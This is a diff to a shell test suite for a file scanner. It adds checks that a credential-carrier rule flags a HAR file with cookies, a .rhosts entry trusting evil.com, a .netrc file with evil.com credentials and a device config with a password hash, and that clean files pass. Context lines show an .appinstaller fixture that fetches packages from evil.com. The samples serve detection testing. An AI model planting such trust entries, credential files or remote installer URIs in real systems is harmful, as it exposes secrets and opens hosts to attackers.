@@ -8469,6 +8469,37 @@ printf '<?xml version="1.0"?><installer-gui-script><pkg-ref id="a"/></installer-
 ./hlse_core file "$XDIR/clean.dist" 2>&1 | grep -q "F56" \
     && check "file: benign .dist no F56" "0" "1" \
     || check "file: benign .dist no F56" "0" "0"
+# F56: credential/session carrier files
+printf '{"log":{"entries":[{"request":{"cookies":[{"name":"s","value":"x"}]}}]}}\n' \
+    > "$XDIR/x.har"
+./hlse_core file "$XDIR/x.har" 2>&1 | grep -q "F56" \
+    && check "file: har with cookies flagged" "0" "0" \
+    || check "file: har with cookies flagged" "0" "1"
+printf '{"log":{"entries":[]}}\n' > "$XDIR/clean.har"
+./hlse_core file "$XDIR/clean.har" 2>&1 | grep -q "F56" \
+    && check "file: empty har no F56" "0" "1" \
+    || check "file: empty har no F56" "0" "0"
+printf '+ evil.com\n' > "$XDIR/.rhosts"
+./hlse_core file "$XDIR/.rhosts" 2>&1 | grep -q "F56" \
+    && check "file: .rhosts flagged" "0" "0" \
+    || check "file: .rhosts flagged" "0" "1"
+printf 'machine evil.com login x password y\n' > "$XDIR/.netrc"
+./hlse_core file "$XDIR/.netrc" 2>&1 | grep -q "F56" \
+    && check "file: .netrc flagged" "0" "0" \
+    || check "file: .netrc flagged" "0" "1"
+printf 'machine ftp.example.com login anonymous\n' > "$XDIR/clean.netrc"
+./hlse_core file "$XDIR/clean.netrc" 2>&1 | grep -q "F56" \
+    && check "file: no-password netrc no F56" "0" "1" \
+    || check "file: no-password netrc no F56" "0" "0"
+printf 'enable password 5 $1$abc\nip domain-name evil.com\n' \
+    > "$XDIR/running-config.cfg"
+./hlse_core file "$XDIR/running-config.cfg" 2>&1 | grep -q "F56" \
+    && check "file: device config flagged" "0" "0" \
+    || check "file: device config flagged" "0" "1"
+printf 'hostname core\ninterface g0/0\n' > "$XDIR/clean.cfg"
+./hlse_core file "$XDIR/clean.cfg" 2>&1 | grep -q "F56" \
+    && check "file: benign cfg no F56" "0" "1" \
+    || check "file: benign cfg no F56" "0" "0"
 # file: .appinstaller remote Uri (F43 extension)
 printf '<?xml version="1.0"?><AppInstaller Uri="http://evil.com/x.appinstaller" Version="1.0"><MainPackage Name="a" Publisher="b" Version="1" Uri="http://evil.com/x.msix"/></AppInstaller>\n' \
     > "$XDIR/x.appinstaller"
